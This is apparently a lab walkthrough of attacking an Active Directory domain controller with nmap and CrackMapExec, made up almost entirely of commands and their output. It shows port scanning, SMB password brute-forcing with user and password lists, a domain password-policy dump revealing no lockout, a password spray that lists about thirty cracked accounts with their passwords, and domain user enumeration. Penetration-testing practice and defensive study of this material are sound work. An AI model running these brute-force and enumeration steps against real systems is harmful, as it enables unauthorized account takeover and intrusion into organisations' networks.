# CrackMapExec on Cracking Active Directory.

## Scanning Open Ports on the Domain Controller.
```
┌─[gemstone@linux-workstation]─[~/Active-Directory/hacks/crackmapexec]
└──╼ $nmap -Pn 192.168.225.155
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 15:18 EAT
Nmap scan report for 192.168.225.155
Host is up (0.00066s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 17.50 seconds
```

## Check IP address on the Workstation Machine (This is assumed to be a usr machine in the Domain)
```
┌─[gemstone@linux-workstation]─[~/Active-Directory/hacks/crackmapexec]
└──╼ $nmap -Pn 192.168.225.134
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 15:24 EAT
Nmap scan report for 192.168.225.134
Host is up (0.00094s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc

Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
```
## Fire up Crackmapexec to obtain initial credentials of the Domain Contoller.
```
┌─[gemstone@linux-workstation]─[~/Active-Directory/hacks/crackmapexec]
└──╼ $crackmapexec smb 192.168.225.155
SMB         192.168.225.155 445    DC-1             [*] Windows 10.0 Build 17763 x64 (name:DC-1) (domain:xyz.com) (signing:True) (SMBv1:False)
```
## Trying to bruteforce wrong username and password.
```
┌─[gemstone@linux-workstation]─[~/Active-Directory/hacks/crackmapexec]
└──╼ $crackmapexec smb targets.txt -u julius -p password
SMB         192.168.225.155 445    DC-1             [*] Windows 10.0 Build 17763 x64 (name:DC-1) (domain:xyz.com) (signing:True) (SMBv1:False)
SMB         192.168.225.155 445    DC-1             [-] xyz.com\julius:password STATUS_LOGON_FAILURE 
```
## Bruteforce by using lists both users list and password list.
```
┌─[gemstone@linux-workstation]─[~/Active-Directory/hacks/crackmapexec]
└──╼ $crackmapexec smb targets.txt -u users.txt -p passwords.txt 
SMB         192.168.225.155 445    DC-1             [*] Windows 10.0 Build 17763 x64 (name:DC-1) (domain:xyz.com) (signing:True) (SMBv1:False)
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:123456 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:12345 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:123456789 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:password STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:iloveyou STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:princess STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:1234567 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:rockyou STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:12345678 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:abc123 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:nicole STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:daniel STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:babygirl STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:monkey STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:lovely STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:jessica STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:654321 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:michael STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:ashley STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:qwerty STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:111111 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:iloveu STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:000000 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:michelle STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:tigger STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:sunshine STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:chocolate STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:password1 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:soccer STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:anthony STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:friends STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:butterfly STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:purple STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:angel STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:jordan STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:liverpool STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:justin STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:loveme STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:fuckyou STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:123123 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:football STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:secret STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:andrea STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:carlos STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:jennifer STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:joshua STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:bubbles STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:1234567890 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:superman STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:hannah STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:amanda STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:loveyou STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:pretty STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:basketball STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:andrew STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:angels STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:tweety STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:flower STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:playboy STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:hello STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:elizabeth STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:hottie STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:tinkerbell STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:charlie STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:samantha STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:barbie STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:chelsea STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:lovers STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:teamo STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:jasmine STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:brandon STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:666666 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:shadow STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:melissa STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:eminem STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:matthew STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:robert STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:danielle STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:forever STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:family STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:jonathan STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:987654321 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:computer STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:whatever STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:dragon STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:vanessa STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:cookie STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:naruto STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:summer STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:sweety STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:spongebob STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:joseph STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:junior STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:softball STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:taylor STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:yellow STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:daniela STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:lauren STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:mickey STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:princesa STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:alexandra STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:alexis STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:jesus STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:estrella STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:miguel STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:william STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:thomas STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:beautiful STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:mylove STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:angela STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:poohbear STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:patrick STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:iloveme STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:sakura STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:adrian STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:alexander STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:destiny STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:christian STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:121212 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:sayang STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:america STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:dancer STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:monica STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:richard STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:112233 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:princess1 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:555555 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:diamond STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:carolina STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:steven STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:rangers STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:louise STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:orange STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:789456 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:999999 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:shorty STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:11111 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:nathan STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:snoopy STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:gabriel STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:hunter STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:cherry STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:killer STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:sandra STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:alejandro STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:buster STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:george STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:brittany STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:alejandra STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:patricia STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:rachel STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:tequiero STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:7777777 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:cheese STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:159753 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:arsenal STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:dolphin STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:antonio STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:heather STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:david STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:ginger STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:stephanie STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:peanut STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:blink182 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:sweetie STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:222222 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:beauty STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:987654 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:victoria STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:honey STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:00000 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:fernando STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:pokemon STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:maggie STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:corazon STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:chicken STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:pepper STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:cristina STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:rainbow STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:kisses STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:manuel STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:myspace STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:rebelde STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:angel1 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:ricardo STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:babygurl STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:heaven STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:55555 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:baseball STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:martin STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:greenday STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:november STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:alyssa STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:madison STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:mother STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:123321 STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:123abc STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:mahalkita STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:batman STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [-] xyz.com\adavies:september STATUS_LOGON_FAILURE 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\adavies:december 
```

## Crackmapexec succed to obtain one user creds and stops.
```
SMB         192.168.225.155 445    DC-1             [+] xyz.com\adavies:december 
```

## Checking the Password Policy of the Domain.
```
┌─[gemstone@linux-workstation]─[~/Active-Directory/hacks/crackmapexec]
└──╼ $crackmapexec smb targets.txt -u adavies -p december --pass-pol
SMB         192.168.225.155 445    DC-1             [*] Windows 10.0 Build 17763 x64 (name:DC-1) (domain:xyz.com) (signing:True) (SMBv1:False)
SMB         192.168.225.155 445    DC-1             [+] xyz.com\adavies:december 
SMB         192.168.225.155 445    DC-1             [+] Dumping password info for domain: XYZ
SMB         192.168.225.155 445    DC-1             Minimum password length: 1
SMB         192.168.225.155 445    DC-1             Password history length: 24
SMB         192.168.225.155 445    DC-1             Maximum password age: 41 days 23 hours 53 minutes 
SMB         192.168.225.155 445    DC-1             
SMB         192.168.225.155 445    DC-1             Password Complexity Flags: 000000
SMB         192.168.225.155 445    DC-1             	Domain Refuse Password Change: 0
SMB         192.168.225.155 445    DC-1             	Domain Password Store Cleartext: 0
SMB         192.168.225.155 445    DC-1             	Domain Password Lockout Admins: 0
SMB         192.168.225.155 445    DC-1             	Domain Password No Clear Change: 0
SMB         192.168.225.155 445    DC-1             	Domain Password No Anon Change: 0
SMB         192.168.225.155 445    DC-1             	Domain Password Complex: 0
SMB         192.168.225.155 445    DC-1             
SMB         192.168.225.155 445    DC-1             Minimum password age: 1 day 4 minutes 
SMB         192.168.225.155 445    DC-1             Reset Account Lockout Counter: 30 minutes 
SMB         192.168.225.155 445    DC-1             Locked Account Duration: 30 minutes 
SMB         192.168.225.155 445    DC-1             Account Lockout Threshold: None
SMB         192.168.225.155 445    DC-1             Forced Log off Time: Not Set
```

##  Adding some option to crackmapexec to make sure that it wont stop after finding the first user credentials.
```
┌─[gemstone@linux-workstation]─[~/Active-Directory/hacks/crackmapexec]
└──╼ $crackmapexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success | grep "[+]"
SMB         192.168.225.155 445    DC-1             [+] xyz.com\adavies:december 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\alambert:gabriela 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\amacdonald:jessie 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\amcdonald:mahalko 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\amiller:barcelona 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\amorgan:michelle 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\anorth:superstar 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\apaterson:gandako 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\aquinn:jennifer 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\areid:love123 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\arussell:heaven 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\aterry:121212 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\awallace:shelby 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\bhardacre:sakura 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\bhudson:dolphins 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\bmcgrath:johnny 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\bthomson:manutd 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\cfisher:cutiepie 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\cjackson:chris 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\cmarshall:mahal 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\cpeters:bianca 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\cwilson:carolina 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\dbond:marie 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\dbutler:654321 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\dchurchill:aaliyah 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\dclark:101010 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\dforsyth:159357 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\dlawrence:shorty 
SMB         192.168.225.155 445    DC-1             [+] xyz.com\doliver:amanda 
```

# Enumarete other Users in Domain.
```
┌─[gemstone@linux-workstation]─[~/Active-Directory/hacks/crackmapexec]
└──╼ $crackmapexec smb targets.txt -u adavies -p december --users
SMB         192.168.225.155 445    DC-1             [*] Windows 10.0 Build 17763 x64 (name:DC-1) (domain:xyz.com) (signing:True) (SMBv1:False)
SMB         192.168.225.155 445    DC-1             [+] xyz.com\adavies:december 
SMB         192.168.225.155 445    DC-1             [+] Enumerated domain user(s)
SMB         192.168.225.155 445    DC-1             xyz.com\oking                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\wcarr                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\doliver                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\mtucker                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\javery                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\epoole                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\msimpson                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\jscott                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\nhodges                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\alambert                       badpwdcount: 795 baddpwdtime: 2022-07-20 12:46:27.282339+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\cmarshall                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\gogden                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\amiller                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\dclark                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\apaterson                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
